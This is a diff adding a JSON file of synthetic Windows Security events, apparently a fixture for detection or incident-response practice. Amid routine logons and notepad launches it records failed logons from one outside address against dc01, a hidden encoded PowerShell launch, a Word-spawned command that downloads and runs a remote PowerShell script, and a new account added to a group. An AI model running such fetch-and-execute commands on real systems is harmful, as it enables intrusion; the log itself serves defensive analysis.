@@ -1,0 +1,377 @@
+[
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:02:55Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.0.12",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:04:35Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "LogonType": 3,
+    "TargetUserName": "analyst",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:07:21Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "LogonType": 3,
+    "TargetUserName": "analyst",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:09:00Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "LogonType": 3,
+    "TargetUserName": "svc_backup",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:11:41Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "LogonType": 3,
+    "TargetUserName": "svc_backup",
+    "IpAddress": "192.168.1.50",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:13:21Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:16:38Z",
+    "Channel": "Security",
+    "Computer": "web02",
+    "LogonType": 3,
+    "TargetUserName": "administrator",
+    "IpAddress": "10.0.1.20",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:18:28Z",
+    "Channel": "Security",
+    "Computer": "web02",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:19:44Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.1.20",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:22:33Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "LogonType": 3,
+    "TargetUserName": "administrator",
+    "IpAddress": "10.0.0.5",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:26:28Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "analyst",
+    "IpAddress": "10.0.1.20",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:29:58Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.0.12",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:33:04Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "LogonType": 3,
+    "TargetUserName": "jsmith",
+    "IpAddress": "10.0.1.20",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:37:02Z",
+    "Channel": "Security",
+    "Computer": "web02",
+    "LogonType": 3,
+    "TargetUserName": "analyst",
+    "IpAddress": "192.168.1.50",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-07-25T09:38:52Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "LogonType": 3,
+    "TargetUserName": "mchen",
+    "IpAddress": "10.0.0.12",
+    "Message": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:43:52Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "root",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:44:34Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "root",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:45:16Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "admin",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:45:58Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "root",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:46:40Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "administrator",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:47:22Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "admin",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-07-25T09:48:04Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "LogonType": 3,
+    "TargetUserName": "admin",
+    "IpAddress": "203.0.113.7",
+    "WorkstationName": "UNKNOWN",
+    "Message": "An account failed to log on."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:00:52Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "TargetUserName": "jsmith",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:08:52Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "TargetUserName": "mchen",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')\"",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4720,
+    "TimeCreated": "2026-07-25T10:23:52Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "TargetUserName": "svc_updater",
+    "Message": "A user account was created."
+  },
+  {
+    "EventID": 4732,
+    "TimeCreated": "2026-07-25T10:24:52Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "TargetUserName": "svc_updater",
+    "Message": "A member was added to a security-enabled local group."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:27:31Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "TargetUserName": "mchen",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:33:28Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "TargetUserName": "svc_backup",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:36:21Z",
+    "Channel": "Security",
+    "Computer": "db01",
+    "TargetUserName": "analyst",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:39:16Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "TargetUserName": "mchen",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:42:52Z",
+    "Channel": "Security",
+    "Computer": "web01",
+    "TargetUserName": "jsmith",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:48:32Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "TargetUserName": "mchen",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:51:23Z",
+    "Channel": "Security",
+    "Computer": "dc01",
+    "TargetUserName": "administrator",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:56:55Z",
+    "Channel": "Security",
+    "Computer": "ws-hr-12",
+    "TargetUserName": "administrator",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T10:59:29Z",
+    "Channel": "Security",
+    "Computer": "web02",
+    "TargetUserName": "jsmith",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-07-25T11:04:28Z",
+    "Channel": "Security",
+    "Computer": "ws-fin-07",
+    "TargetUserName": "mchen",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe report.txt",
+    "Message": "A new process has been created."
+  }
+]
